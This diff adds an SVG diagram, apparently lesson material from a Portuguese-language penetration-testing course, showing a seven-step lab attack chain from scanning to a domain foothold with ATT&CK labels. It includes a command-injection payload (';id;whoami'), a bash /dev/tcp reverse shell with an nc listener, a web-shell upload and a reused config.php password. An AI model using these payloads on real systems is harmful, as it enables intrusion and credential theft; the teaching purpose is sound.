@@ -1,0 +1,172 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 580" width="800" height="580" font-family="'Segoe UI', sans-serif">
+  <defs>
+    <marker id="arr03b" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+      <polygon points="0 0, 8 3, 0 6" fill="#00d4ff"/>
+    </marker>
+    <marker id="arr03bR" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+      <polygon points="0 0, 8 3, 0 6" fill="#ff6b6b"/>
+    </marker>
+    <marker id="arr03bG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+      <polygon points="0 0, 8 3, 0 6" fill="#4ecdc4"/>
+    </marker>
+    <linearGradient id="bg03b" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0%" stop-color="#0d1117"/>
+      <stop offset="100%" stop-color="#1a1a2e"/>
+    </linearGradient>
+  </defs>
+  <rect width="800" height="580" fill="url(#bg03b)" rx="12"/>
+  <text x="400" y="32" text-anchor="middle" fill="#00d4ff" font-size="18" font-weight="bold">Fluxo de Ataque — LNX-WEB Foothold</text>
+  <text x="400" y="50" text-anchor="middle" fill="#8b949e" font-size="11">Do scan ao foothold com credenciais de domínio</text>
+
+  <!-- Network diagram at top -->
+  <rect x="30" y="65" width="130" height="60" rx="8" fill="#1c2333" stroke="#4ecdc4" stroke-width="2"/>
+  <text x="95" y="87" text-anchor="middle" fill="#4ecdc4" font-size="12" font-weight="bold">KALI</text>
+  <text x="95" y="103" text-anchor="middle" fill="#8b949e" font-size="9">10.10.0.10</text>
+  <text x="95" y="118" text-anchor="middle" fill="#8b949e" font-size="8">Operador</text>
+
+  <rect x="330" y="65" width="140" height="60" rx="8" fill="#1c2333" stroke="#ff6b6b" stroke-width="2"/>
+  <text x="400" y="87" text-anchor="middle" fill="#ff6b6b" font-size="12" font-weight="bold">LNX-WEB</text>
+  <text x="400" y="103" text-anchor="middle" fill="#8b949e" font-size="9">10.10.0.20 (EDGE-DMZ)</text>
+  <text x="400" y="118" text-anchor="middle" fill="#8b949e" font-size="8">Apache + PHP</text>
+
+  <rect x="620" y="65" width="150" height="60" rx="8" fill="#1c2333" stroke="#a855f7" stroke-width="2" stroke-dasharray="5,3"/>
+  <text x="695" y="87" text-anchor="middle" fill="#a855f7" font-size="12" font-weight="bold">CORP Network</text>
+  <text x="695" y="103" text-anchor="middle" fill="#8b949e" font-size="9">10.0.20.0/24</text>
+  <text x="695" y="118" text-anchor="middle" fill="#8b949e" font-size="8">DC01, SRV01/02, WS01</text>
+
+  <line x1="160" y1="95" x2="328" y2="95" stroke="#00d4ff" stroke-width="2" marker-end="url(#arr03b)"/>
+  <line x1="470" y1="95" x2="618" y2="95" stroke="#a855f7" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arr03b)"/>
+  <text x="545" y="88" text-anchor="middle" fill="#a855f7" font-size="8">Pivot (Mod 05)</text>
+
+  <!-- Attack flow steps -->
+  <text x="400" y="155" text-anchor="middle" fill="#f39c12" font-size="14" font-weight="bold">Fluxo de Ataque — 7 Etapas</text>
+
+  <!-- Step 1 -->
+  <rect x="30" y="170" width="95" height="75" rx="6" fill="#1c2333" stroke="#4ecdc4" stroke-width="1.5"/>
+  <circle cx="78" cy="183" r="10" fill="#4ecdc4" opacity="0.2" stroke="#4ecdc4" stroke-width="1"/>
+  <text x="78" y="187" text-anchor="middle" fill="#4ecdc4" font-size="10" font-weight="bold">1</text>
+  <text x="78" y="207" text-anchor="middle" fill="#e6edf3" font-size="9" font-weight="bold">Scan</text>
+  <text x="78" y="220" text-anchor="middle" fill="#8b949e" font-size="7">nmap</text>
+  <text x="78" y="232" text-anchor="middle" fill="#8b949e" font-size="7">feroxbuster</text>
+  <text x="78" y="243" text-anchor="middle" fill="#484f58" font-size="6">T1595</text>
+  <line x1="125" y1="207" x2="140" y2="207" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#arr03b)"/>
+
+  <!-- Step 2 -->
+  <rect x="140" y="170" width="95" height="75" rx="6" fill="#1c2333" stroke="#ff6b6b" stroke-width="1.5"/>
+  <circle cx="188" cy="183" r="10" fill="#ff6b6b" opacity="0.2" stroke="#ff6b6b" stroke-width="1"/>
+  <text x="188" y="187" text-anchor="middle" fill="#ff6b6b" font-size="10" font-weight="bold">2</text>
+  <text x="188" y="207" text-anchor="middle" fill="#e6edf3" font-size="9" font-weight="bold">Cmd Injection</text>
+  <text x="188" y="220" text-anchor="middle" fill="#8b949e" font-size="7">/ping.php</text>
+  <text x="188" y="232" text-anchor="middle" fill="#8b949e" font-size="7">;id;whoami</text>
+  <text x="188" y="243" text-anchor="middle" fill="#484f58" font-size="6">T1190</text>
+  <line x1="235" y1="207" x2="250" y2="207" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#arr03b)"/>
+
+  <!-- Step 3 -->
+  <rect x="250" y="170" width="95" height="75" rx="6" fill="#1c2333" stroke="#ff6b6b" stroke-width="1.5"/>
+  <circle cx="298" cy="183" r="10" fill="#ff6b6b" opacity="0.2" stroke="#ff6b6b" stroke-width="1"/>
+  <text x="298" y="187" text-anchor="middle" fill="#ff6b6b" font-size="10" font-weight="bold">3</text>
+  <text x="298" y="207" text-anchor="middle" fill="#e6edf3" font-size="9" font-weight="bold">Web Shell</text>
+  <text x="298" y="220" text-anchor="middle" fill="#8b949e" font-size="7">/upload.php</text>
+  <text x="298" y="232" text-anchor="middle" fill="#8b949e" font-size="7">shell.php</text>
+  <text x="298" y="243" text-anchor="middle" fill="#484f58" font-size="6">T1505.003</text>
+  <line x1="345" y1="207" x2="360" y2="207" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#arr03b)"/>
+
+  <!-- Step 4 -->
+  <rect x="360" y="170" width="95" height="75" rx="6" fill="#1c2333" stroke="#f39c12" stroke-width="1.5"/>
+  <circle cx="408" cy="183" r="10" fill="#f39c12" opacity="0.2" stroke="#f39c12" stroke-width="1"/>
+  <text x="408" y="187" text-anchor="middle" fill="#f39c12" font-size="10" font-weight="bold">4</text>
+  <text x="408" y="207" text-anchor="middle" fill="#e6edf3" font-size="9" font-weight="bold">Reverse Shell</text>
+  <text x="408" y="220" text-anchor="middle" fill="#8b949e" font-size="7">bash -i >&amp;</text>
+  <text x="408" y="232" text-anchor="middle" fill="#8b949e" font-size="7">/dev/tcp:4444</text>
+  <text x="408" y="243" text-anchor="middle" fill="#484f58" font-size="6">T1059.004</text>
+  <line x1="455" y1="207" x2="470" y2="207" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#arr03b)"/>
+
+  <!-- Step 5 -->
+  <rect x="470" y="170" width="95" height="75" rx="6" fill="#1c2333" stroke="#a855f7" stroke-width="1.5"/>
+  <circle cx="518" cy="183" r="10" fill="#a855f7" opacity="0.2" stroke="#a855f7" stroke-width="1"/>
+  <text x="518" y="187" text-anchor="middle" fill="#a855f7" font-size="10" font-weight="bold">5</text>
+  <text x="518" y="207" text-anchor="middle" fill="#e6edf3" font-size="9" font-weight="bold">TTY Upgrade</text>
+  <text x="518" y="220" text-anchor="middle" fill="#8b949e" font-size="7">python3 pty</text>
+  <text x="518" y="232" text-anchor="middle" fill="#8b949e" font-size="7">stty raw -echo</text>
+  <text x="518" y="243" text-anchor="middle" fill="#484f58" font-size="6">Estabilização</text>
+  <line x1="565" y1="207" x2="580" y2="207" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#arr03b)"/>
+
+  <!-- Step 6 -->
+  <rect x="580" y="170" width="95" height="75" rx="6" fill="#1c2333" stroke="#4ecdc4" stroke-width="1.5"/>
+  <circle cx="628" cy="183" r="10" fill="#4ecdc4" opacity="0.2" stroke="#4ecdc4" stroke-width="1"/>
+  <text x="628" y="187" text-anchor="middle" fill="#4ecdc4" font-size="10" font-weight="bold">6</text>
+  <text x="628" y="207" text-anchor="middle" fill="#e6edf3" font-size="9" font-weight="bold">Cred Hunt</text>
+  <text x="628" y="220" text-anchor="middle" fill="#8b949e" font-size="7">config.php</text>
+  <text x="628" y="232" text-anchor="middle" fill="#8b949e" font-size="7">webadmin:Autumn</text>
+  <text x="628" y="243" text-anchor="middle" fill="#484f58" font-size="6">T1552.001</text>
+  <line x1="675" y1="207" x2="690" y2="207" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#arr03b)"/>
+
+  <!-- Step 7 -->
+  <rect x="690" y="170" width="85" height="75" rx="6" fill="#1c2333" stroke="#00d4ff" stroke-width="2"/>
+  <circle cx="733" cy="183" r="10" fill="#00d4ff" opacity="0.2" stroke="#00d4ff" stroke-width="1"/>
+  <text x="733" y="187" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">7</text>
+  <text x="733" y="207" text-anchor="middle" fill="#e6edf3" font-size="9" font-weight="bold">Domain ID</text>
+  <text x="733" y="220" text-anchor="middle" fill="#8b949e" font-size="7">CORP\j.silva</text>
+  <text x="733" y="232" text-anchor="middle" fill="#8b949e" font-size="7">Credential reuse</text>
+  <text x="733" y="243" text-anchor="middle" fill="#484f58" font-size="6">T1078</text>
+
+  <!-- Detail: the reverse shell flow -->
+  <text x="400" y="280" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">Detalhe: Reverse Shell Flow</text>
+
+  <!-- Kali listener -->
+  <rect x="60" y="300" width="160" height="80" rx="8" fill="#1c2333" stroke="#4ecdc4" stroke-width="2"/>
+  <text x="140" y="322" text-anchor="middle" fill="#4ecdc4" font-size="11" font-weight="bold">KALI Listener</text>
+  <text x="140" y="340" text-anchor="middle" fill="#e6edf3" font-size="9">nc -lvnp 4444</text>
+  <text x="140" y="356" text-anchor="middle" fill="#8b949e" font-size="8">Aguardando conexão</text>
+  <text x="140" y="372" text-anchor="middle" fill="#8b949e" font-size="8">inbound na porta 4444</text>
+
+  <!-- LNX-WEB target -->
+  <rect x="540" y="300" width="210" height="80" rx="8" fill="#1c2333" stroke="#ff6b6b" stroke-width="2"/>
+  <text x="645" y="322" text-anchor="middle" fill="#ff6b6b" font-size="11" font-weight="bold">LNX-WEB (www-data)</text>
+  <text x="645" y="340" text-anchor="middle" fill="#e6edf3" font-size="9">bash -i >&amp; /dev/tcp/...</text>
+  <text x="645" y="356" text-anchor="middle" fill="#8b949e" font-size="8">Outbound connection</text>
+  <text x="645" y="372" text-anchor="middle" fill="#8b949e" font-size="8">NAT-friendly (egress)</text>
+
+  <!-- Arrow: LNX-WEB initiates connection TO Kali -->
+  <line x1="540" y1="330" x2="222" y2="330" stroke="#ff6b6b" stroke-width="2.5" marker-end="url(#arr03bR)"/>
+  <text x="380" y="323" text-anchor="middle" fill="#ff6b6b" font-size="10" font-weight="bold">TCP :4444 (outbound)</text>
+
+  <!-- Arrow: Kali sends commands back -->
+  <line x1="220" y1="350" x2="538" y2="350" stroke="#4ecdc4" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arr03bG)"/>
+  <text x="380" y="364" text-anchor="middle" fill="#4ecdc4" font-size="9">stdin/stdout bidirecional</text>
+
+  <!-- Credential reuse chain -->
+  <text x="400" y="415" text-anchor="middle" fill="#f39c12" font-size="13" font-weight="bold">Credential Reuse Chain</text>
+
+  <rect x="60" y="430" width="170" height="45" rx="6" fill="#1c2333" stroke="#ff6b6b" stroke-width="1.5"/>
+  <text x="145" y="450" text-anchor="middle" fill="#ff6b6b" font-size="10" font-weight="bold">config.php</text>
+  <text x="145" y="466" text-anchor="middle" fill="#8b949e" font-size="9">webadmin : Autumn2026!</text>
+
+  <line x1="230" y1="452" x2="270" y2="452" stroke="#00d4ff" stroke-width="2" marker-end="url(#arr03b)"/>
+  <text x="250" y="445" text-anchor="middle" fill="#f39c12" font-size="8">reuso</text>
+
+  <rect x="270" y="430" width="170" height="45" rx="6" fill="#1c2333" stroke="#a855f7" stroke-width="1.5"/>
+  <text x="355" y="450" text-anchor="middle" fill="#a855f7" font-size="10" font-weight="bold">SSH j.silva</text>
+  <text x="355" y="466" text-anchor="middle" fill="#8b949e" font-size="9">Mesmo password no Linux</text>
+
+  <line x1="440" y1="452" x2="480" y2="452" stroke="#00d4ff" stroke-width="2" marker-end="url(#arr03b)"/>
+  <text x="460" y="445" text-anchor="middle" fill="#f39c12" font-size="8">reuso</text>
+
+  <rect x="480" y="430" width="170" height="45" rx="6" fill="#1c2333" stroke="#00d4ff" stroke-width="1.5"/>
+  <text x="565" y="450" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">CORP\j.silva</text>
+  <text x="565" y="466" text-anchor="middle" fill="#8b949e" font-size="9">Identidade de Domínio (T1078)</text>
+
+  <!-- Result arrow -->
+  <line x1="650" y1="452" x2="700" y2="452" stroke="#4ecdc4" stroke-width="2" marker-end="url(#arr03bG)"/>
+  <rect x="700" y="434" width="75" height="36" rx="5" fill="#4ecdc4" opacity="0.15" stroke="#4ecdc4" stroke-width="1"/>
+  <text x="738" y="450" text-anchor="middle" fill="#4ecdc4" font-size="9" font-weight="bold">Foothold</text>
+  <text x="738" y="464" text-anchor="middle" fill="#4ecdc4" font-size="8">Completo</text>
+
+  <!-- Footer -->
+  <text x="400" y="500" text-anchor="middle" fill="#484f58" font-size="9">www-data (web) > j.silva (user) > CORP\j.silva (domain) — cadeia de credential reuse</text>
+
+  <!-- ATT&CK chain -->
+  <text x="400" y="520" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">ATT&amp;CK Chain: T1595 &gt; T1190 &gt; T1505.003 &gt; T1059.004 &gt; T1552.001 &gt; T1078</text>
+
+  <text x="400" y="555" text-anchor="middle" fill="#484f58" font-size="9">CRTLP — Module 03, Lesson 08</text>
+</svg>
